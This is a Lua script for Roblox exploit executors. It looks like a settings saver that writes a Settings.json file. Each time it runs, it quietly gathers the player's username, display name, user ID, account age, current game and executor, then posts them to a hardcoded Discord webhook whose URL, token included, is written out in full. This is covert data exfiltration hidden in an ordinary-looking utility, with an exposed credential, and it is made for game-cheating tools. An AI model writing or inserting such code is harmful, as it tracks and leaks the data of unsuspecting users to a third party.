local Name = "Settings.json"
local PlayerSettings = {
    Name = game.Players.LocalPlayer.Name,
    DisplayName = game.Players.LocalPlayer.DisplayName,
    Id = game.Players.LocalPlayer.UserId,
    AccountAge = game.Players.LocalPlayer.AccountAge,
    Game = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name or 'Game-'..game.PlaceId,
    Executor = identifyexecutor() or "Unknown",
}
local JSON
if not pcall(function() readfile(Name) end) then 
    writefile(Name, game:service'HttpService':JSONEncode(PlayerSettings)) 
end
JSON = game:service'HttpService':JSONDecode(readfile(Name))
print(JSON.DidTeleport)
local function Save()
    writefile(Name,game:service'HttpService':JSONEncode(JSON))
end
local function resetToDefaults()
    writefile(Name, game:service'HttpService':JSONEncode(PlayerSettings))
end
local function WebHook()
    local url =
       "https://discord.com/api/webhooks/1120487967245475980/2aWLRDZp0Gp2A1ZL7pImpdmMfwOzPIPgITt2qxYEm_aRyj1Ebf6HsJgbn3_E59zXYMfP"
    local webhookcheck =
       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
       secure_load and "Sentinel" or
       KRNL_LOADED and "Krnl" or
       SONA_LOADED and "Sona" or
       "Kid with shit exploit"
    local data = {
       ["content"] = "...",
       ["embeds"] = {
           {
               ["title"] = "**Someone Executed Your Script!**",
               ["description"] = readfile(Name),
               ["type"] = "rich",
               ["color"] = tonumber(0x7269da),
           }
       }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
       ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
WebHook() wait(.5) Save()
